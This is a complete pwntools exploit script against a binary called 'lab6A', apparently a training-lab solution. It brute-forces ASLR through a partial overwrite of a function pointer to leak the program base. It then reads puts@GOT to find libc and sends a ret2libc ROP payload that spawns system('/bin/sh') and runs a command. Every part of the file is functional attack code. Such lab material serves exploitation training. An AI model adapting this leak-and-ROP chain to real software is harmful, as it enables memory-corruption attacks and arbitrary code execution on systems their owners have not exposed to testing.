from pwn import *
from contextlib import suppress

print_name_offset = 0x00000BE2
# choice is at 0xffe65808 (4 bytes before userinfo)
# userinfo starts at 0xffe6580c

# make_note buf overwrite eip offset cyclic_find(0x6161616e) = 52


def change_sfunc(p, sfunc_addr):
    p.sendline(b"1")
    p.clean()

    # fill user->name
    p.send(b"FAKE" + b"\x00" * 28)
    p.clean()

    # fill what's left in user->desc, then overwrite user->sfunc.
    p.send(b"B" * 118 + p32(sfunc_addr) + b"\x00" * (128 - 118 - 4))


def read_two_dwords(p: pwnlib.tubes.process.process, addr: int):
    p.sendline(b"1")
    p.clean()

    # write the address we want to read into userinfo->name.
    p.send(p32(addr) + b"\x00" * 28)
    p.clean()
    p.send(b"\x00" * 128)

    # trigger the read
    trigger_sfunc(p)

    p.recvuntil(b"Enter Choice: ", drop=True)
    data = p.recv(8)
    if data == b"Enter Ch":
        # read failed - write() probably returned with an error
        return None, None

    return u32(data[:4]), u32(data[4:])


def find_sfunc_from_leak(leak):
    # our leak is from printf("%s\n", user->name)
    # therefore it will first contain user->name (32 bytes), user->desc (132) bytes, and then user->sfunc (4 bytes).
    leak = leak[160:]
    if len(leak) < 4:
        error("BUG: leak failed")

    return u32(leak[:4])


def first_stage():
    bf = log.progress("Bruteforcing randomized second-last byte of print_name()")

    # aslr guess
    guessed_byte = 0xD
    guessed_print_name_low_bytes = guessed_byte * 0x1000 + print_name_offset

    while True:
        with suppress(EOFError), context.quiet:
            p = process("./lab6A")
            p.clean()
            p.sendline(b"1")  # make account

            # username will not be null terminated because of our input.
            p.send(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

            # overwrite 2 least significat least bytes of sfunc ptr
            p.send(b"B" * 90 + p16(guessed_print_name_low_bytes))

            # trigger the sfunc (which should point to print_username(), which in turn will leak stack data)
            trigger_sfunc(p)
            tmp = p.recvuntil(b"Username: ", drop=True, timeout=0.1)
            if tmp != b"":
                break

            p.close()
            continue

    bf.success("Done")
    leak = p.recvline(keepends=False)
    sfunc = find_sfunc_from_leak(leak)
    base_addr = sfunc - print_name_offset
    info(f"Got sfunc ptr leak! sfunc [print_name() addr] = {sfunc:#x}")
    info(f"Calculated base address = {base_addr:#x}")
    p.clean()
    return p, base_addr


def trigger_sfunc(p):
    p.sendline(b"3")


def second_stage(p, base_addr):
    with context.quiet:
        elf = ELF("./lab6A")
        libc = elf.libc

    elf.address = base_addr
    write_wrap_addr = elf.sym["write_wrap"]
    make_note_addr = elf.sym["make_note"]

    # find libc base address
    puts_got = elf.got["puts"]
    info(f"Performing arbitrary read of got@puts [{puts_got:#x}]...")
    info("Modifying sfunc ptr to point to write_wrap...")
    change_sfunc(p, write_wrap_addr)
    puts_addr, _ = read_two_dwords(p, puts_got)
    info(f"libc@puts address (read from got@puts): {puts_addr:#x}")
    libc.address = puts_addr - libc.sym["puts"]
    info(f"Calculated libc base address: {libc.address:#x}")

    # trigger system("/bin/sh")
    info("Modifying sfunc ptr to point to make_note...")
    change_sfunc(p, make_note_addr)
    trigger_sfunc(p)

    info("Feeding note data with ROP payload to trigger system(/bin/sh)...")
    rop_payload = (
        b"A" * 52
        + p32(libc.sym["system"])
        + p32(0xDEADBEEF)  # ret address for system - we don't care
        + p32(next(libc.search(b"/bin/sh\x00")))
    )
    p.sendline(rop_payload)


def exploit(cmd):
    p, base_addr = first_stage()
    info("Starting exploit second stage...")
    second_stage(p, base_addr)
    p.clean()

    cmd += " ; echo pwned"
    p.sendline(cmd.encode())

    output = p.recvuntil(b"pwned", drop=True, timeout=3)
    if output == b"":
        # timeout
        error("Exploit failed!")

    return output.decode().strip()


if __name__ == "__main__":
    output = exploit("date")
    info("Payload executed. output:\n")
    print(output)
